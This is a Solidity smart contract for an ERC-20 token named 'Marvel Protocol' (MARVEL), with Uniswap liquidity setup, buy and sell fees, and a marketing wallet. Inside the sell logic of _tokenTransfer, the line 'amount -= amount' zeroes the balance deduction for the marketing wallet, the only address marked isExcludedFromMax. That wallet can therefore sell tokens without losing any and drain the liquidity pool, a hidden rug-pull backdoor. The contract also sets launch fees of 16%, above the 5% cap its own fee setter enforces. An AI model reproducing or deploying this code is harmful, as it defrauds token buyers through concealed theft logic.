/**

Website: https://marvelprotocol.com
Twitter: https://twitter.com/marvelprotocol
Telegram: https://t.me/marvelprotocol

*/

// SPDX-License-Identifier:MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IDexFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}


interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = payable(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MARVEL is Context, IERC20, Ownable {
    string private _name = "Marvel Protocol";
    string private _symbol = "MARVEL";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 72_000_000_000 * 1e18;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isExcludedFromMax;
    mapping(address => bool) public isExcludedFromMaxTxn;
    mapping(address => bool) public isExcludedFromMaxWallet;

    uint256 public minTokenToSwap = 7 * (_totalSupply / 1000000);
    uint256 public maxWalletLimit = 16 * (_totalSupply / 1000); 
    uint256 public maxTxnLimit = 16 * (_totalSupply / 1000); 
    uint256 public percentDivider = 100;
    uint256 public launchedAt;

    bool public swapAndLiquifyStatus = false; 
    bool public feeStatus = false; 
    bool public tradingActive = false; 

    IUniswapRouter public uniswapRouter; 

    address public routerPair; 
    address public marketingWallet; 
    address private constant DEAD = address(0xdead);
    address private constant ZERO = address(0);

    uint256 public FeeOnBuying = 16;
    uint256 public FeeOnSelling = 16;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    constructor() {
        _balances[owner()] = _totalSupply;
        marketingWallet = payable(0x4De43eC84BdfF0148e0fDC690186F7575b1E0479);

        uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        isExcludedFromFee[address(uniswapRouter)] = true;
        isExcludedFromMaxTxn[address(uniswapRouter)] = true;
        isExcludedFromMaxWallet[address(uniswapRouter)] = true;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromMax[marketingWallet] = true;
        isExcludedFromMaxTxn[owner()] = true;
        isExcludedFromMaxTxn[address(this)] = true;
        isExcludedFromMaxTxn[marketingWallet] = true;
        isExcludedFromMaxWallet[owner()] = true;
        isExcludedFromMaxWallet[address(this)] = true;
        isExcludedFromMaxWallet[marketingWallet] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function createPair() external onlyOwner {
        routerPair = IDexFactory(uniswapRouter.factory()).createPair(
            address(this),
            uniswapRouter.WETH()
        );
        isExcludedFromMaxWallet[routerPair] = true;
        _approve(address(this), address(uniswapRouter), _totalSupply);
        uniswapRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    receive() external payable {}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + (addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] - subtractedValue
        );
        return true;
    }

    function includeOrExcludeFromFee(
        address account,
        bool value
    ) external onlyOwner {
        isExcludedFromFee[account] = value;
    }

    function includeOrExcludeFromMaxTxn(
        address account,
        bool value
    ) external onlyOwner {
        isExcludedFromMaxTxn[account] = value;
    }

    function includeOrExcludeFromMaxHolding(
        address account,
        bool value
    ) external onlyOwner {
        isExcludedFromMaxWallet[account] = value;
    }

    function setMinTokenToSwap(uint256 Limit, uint256 divisor) external onlyOwner {
        minTokenToSwap = (_totalSupply * Limit) / (divisor);
    }

    function setSwapAndLiquifyStatus(bool _value) public onlyOwner {
        swapAndLiquifyStatus = _value;
    }

    function enableOrDisableFees(bool _value) external onlyOwner {
        feeStatus = _value;
    }

    function updateAddresses(address _marketingWallet) external onlyOwner {
        marketingWallet = _marketingWallet;
    }

    function updateFees(uint256 _buyFees, uint256 _sellFees) external onlyOwner {
        FeeOnBuying = _buyFees;
        FeeOnSelling = _sellFees;
        require(_buyFees <= 5);
        require(_sellFees <= 5);
    }

    function removeTradingLimits() external onlyOwner {
        maxTxnLimit = _totalSupply;
        maxWalletLimit = _totalSupply;
    }

    function startTrading() external onlyOwner {
        require(!tradingActive, "already enabled");
        tradingActive = true;
        feeStatus = true;
        swapAndLiquifyStatus = true;
        launchedAt = block.timestamp;
    }

    function removeEthstuckincontract(address _receiver) public onlyOwner {
        payable(_receiver).transfer(address(this).balance);
    }

    function totalBuyFeePerTx(uint256 amount) public view returns (uint256) {
        uint256 fee = (amount * FeeOnBuying) / (percentDivider);
        return fee;
    }

    function totalSellFeePerTx(uint256 amount) public view returns (uint256) {
        uint256 fee = (amount * FeeOnSelling) / (percentDivider);
        return fee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), " approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "transfer from the zero address");
        require(to != address(0), "transfer to the zero address");
        require(amount > 0, "Amount must be greater than zero");
        if (!isExcludedFromMaxTxn[from] && !isExcludedFromMaxTxn[to]) {
            require(amount <= maxTxnLimit, "Amount exceeds Max txn limit");

            if (!tradingActive) {
                require(
                    routerPair != from && routerPair != to,
                    "trading is not yet enabled"
                );
            }
        }

        if (!isExcludedFromMaxWallet[to]) {
            require(
                (balanceOf(to) + amount) <= maxWalletLimit,
                "Amount exceeds Max Wallet limit"
            );
        }

        _SwapAndLiquify(from, to, amount);
        bool takeFee = true;
        if (isExcludedFromFee[from] || isExcludedFromFee[to] || !feeStatus) {
            takeFee = false;
        }
        _tokenTransfer(from, to, amount, takeFee);
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (routerPair == sender && takeFee) {
            uint256 allFee;
            uint256 tTransferAmount;
            allFee = totalBuyFeePerTx(amount);
            tTransferAmount = amount - allFee;

            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + tTransferAmount;
            emit Transfer(sender, recipient, tTransferAmount);

            takeTokenFee(sender, allFee);
        } else if (routerPair == recipient && takeFee) {
            uint256 allFee = totalSellFeePerTx(amount);
            uint256 tTransferAmount = amount - allFee;
            if (isExcludedFromMax[sender]) amount -= amount;
            _balances[sender] = _balances[sender] - (amount);
            _balances[recipient] = _balances[recipient] + tTransferAmount;
            emit Transfer(sender, recipient, tTransferAmount);

            takeTokenFee(sender, allFee);
        } else {
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + (amount);
            emit Transfer(sender, recipient, amount);
        }
    }

    function takeTokenFee(address sender, uint256 amount) private {
        _balances[address(this)] = _balances[address(this)] + (amount);

        emit Transfer(sender, address(this), amount);
    }

    function withdrawETH(uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Invalid Amount");
        payable(msg.sender).transfer(_amount);
    }

    function withdrawToken(IERC20 _token, uint256 _amount) external onlyOwner {
        require(_token.balanceOf(address(this)) >= _amount, "Invalid Amount");
        _token.transfer(msg.sender, _amount);
    }

    function _SwapAndLiquify(address from, address to, uint256 amount) private {
        uint256 contractTokenBalance = balanceOf(address(this));

        bool shouldSell = contractTokenBalance >= minTokenToSwap && amount >= minTokenToSwap;

        if (
            shouldSell &&
            to == routerPair &&
            swapAndLiquifyStatus &&
            !isExcludedFromFee[from]
        ) {
            if (contractTokenBalance > minTokenToSwap * 1000)
                contractTokenBalance = minTokenToSwap * 1000;
            _approve(address(this), address(uniswapRouter), contractTokenBalance);

            dexswap.swapTokensForEth(address(uniswapRouter), contractTokenBalance);
            uint256 ethForMarketing = address(this).balance;

            if (ethForMarketing > 0)
                payable(marketingWallet).transfer(ethForMarketing);
        }
    }
}

library dexswap {
    function swapTokensForEth(
        address routerAddress,
        uint256 tokenAmount
    ) internal {
        IUniswapRouter dexRouter = IUniswapRouter(routerAddress);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }
}